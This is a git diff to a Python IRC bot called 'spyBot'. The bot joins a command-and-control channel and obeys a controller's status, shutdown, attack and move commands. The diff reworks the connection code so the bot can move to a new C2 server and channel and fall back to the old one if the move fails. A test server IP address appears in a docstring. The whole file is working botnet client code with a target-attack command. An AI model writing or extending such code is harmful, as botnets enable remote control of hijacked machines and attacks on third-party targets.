@@ -24,6 +24,12 @@ class Bot():
         self.nickname = 'spyBot'# + str(random.randint(1, 20))
         self.controller = None
         self.controller_nickname = None
+
+        # move
+        self.move_host = None
+        self.move_port = None
+        self.move_channel = None
+        self.move_socket = None
         
         # attack variables
         self.target_socket = None
@@ -50,7 +56,7 @@ class Bot():
         send any message to target
         '''
         self.target_socket.send((msg + '\n').encode('utf-8'))
-
+    
     def __send_message(self, msg):
         '''
         send any message to irc server
@@ -68,31 +74,50 @@ class Bot():
             self.__send_message('PONG ' + received_msg.split() [1] + '\r\n')
 
         return received_msg
+    
+    def __attempt_connection(self):
+        '''
+        '''
+        return self.__connect(self.move_socket, self.move_host, int(self.move_port), self.move_channel, self.nickname)
 
-    def __connect(self):
+    def __connect_to_irc(self):
         '''
         connect to IRC server
         test IRC server:
             162.246.156.17
             12399
         '''
-        log('Connecting to: {}:{}, channel: {}, nickname: {}'.format(self.irc_host, int(self.irc_port), self.channel, self.nickname))
-        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.irc_socket.settimeout(5000)
+        self.irc_socket = self.__connect(self.irc_socket, self.irc_host, int(self.irc_port), self.channel, self.nickname)
+
+    def __connect(self, sock, host, port, channel, nickname):
+        '''
+        connect to IRC server using provided:
+            sock
+            host
+            port
+            channel
+            nickname
+        '''
+        log('Connecting to: {}:{}, channel: {}, nickname: {}'.format(host, port, channel, nickname))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5000)
         while True:
             try:
-                self.irc_socket.connect((self.irc_host, int(self.irc_port)))
+                sock.connect((host, int(port)))
             except socket.timeout:
                 log('IRC connection timedout!')
+                return False
             except:
-                log('Can\'t connect to: {}:{}, channel: {}'.format(self.irc_host, int(self.irc_port), self.channel))
+                log('Can\'t connect to: {}:{}, channel: {}'.format(host, int(port), channel))
+                return False
             break
-        self.__authenticate()
+        self.__authenticate(sock, nickname, channel)
+        return sock
     
-    def __authenticate(self):
-        self.__send_message('USER ' + self.nickname + ' ' + self.nickname + ' ' + self.nickname + ' :\n')
-        self.__send_message('NICK ' + self.nickname + '\n')
-        self.__send_message('JOIN ' + self.channel + '\n')
+    def __authenticate(self, sock, nickname, channel):
+        sock.send(('USER ' + nickname + ' ' + nickname + ' ' + nickname + ' :\n').encode('utf-8'))
+        sock.send(('NICK ' + nickname + '\n').encode('utf-8'))
+        sock.send(('JOIN ' + channel + '\n').encode('utf-8'))
 
     def __connect_to_target(self):
         '''
@@ -124,25 +149,25 @@ class Bot():
             try:
                 self.__do_status()
             except ValueError as e:
-                log('Error: {}'.format(e))
+                log('Status Command Error: {}'.format(e))
         
         elif cmd.startswith('shutdown'):
             try:
                 self.__do_shutdown()
             except ValueError as e:
-                log('Error: {}'.format(e))
+                log('Shutdown Command Error: {}'.format(e))
         
         elif cmd.startswith('attack'):
             try:
                 self.__do_attack(cmd)
             except ValueError as e:
-                log('Error: {}'.format(e))
+                log('Attack Command Error: {}'.format(e))
         
         elif cmd.startswith('move'):
             try:
                 self.__do_move(cmd)
             except ValueError as e:
-                log('Error: {}'.format(e))
+                log('Move Command Error: {}'.format(e))
         
         else:
             raise ValueError('Invalid command!')
@@ -221,7 +246,7 @@ class Bot():
                 log('Disconnected from server.')
                 return
             except ValueError as e:
-                log('Error: {}'.format(e))
+                log('Handle Command Error: {}'.format(e))
 
     def __do_status(self):
         '''
@@ -292,14 +317,21 @@ class Bot():
         except ValueError:
             raise ValueError('Failed to split move.')
         log('Moving to {}:{}, channel {}'.format(host, int(port), channel))
-        self.irc_host = host
+        
+        self.move_host = host
         if self.__validate_port(port):
-            self.irc_port = int(port)
+            self.move_port = int(port)
         else:
             raise ValueError('Invalid port: {}'.format(port))
-        self.channel = '#' + channel
+        
+        self.move_channel = '#' + channel
+        self.move_socket = self.__attempt_connection()
+        if not self.move_socket:
+            log('Can\'t move to {}:{}, channel: {}\nReporting back to {}:{}, channel: {}'.format(self.move_host, self.move_port, self.move_channel, self.irc_host, self.irc_port, self.channel))
+            return False
         self.irc_socket.close()
-        self.start_bot()
+        self.irc_socket = self.move_socket
+        self.__listen()
 
     def __validate_port(self, port):
         return int(port) in range(0, 65536)
@@ -309,7 +341,7 @@ class Bot():
         start bot
         source: https://stackoverflow.com/questions/2968408
         '''
-        self.__connect()
+        self.__connect_to_irc()
         self.__listen()
 
 
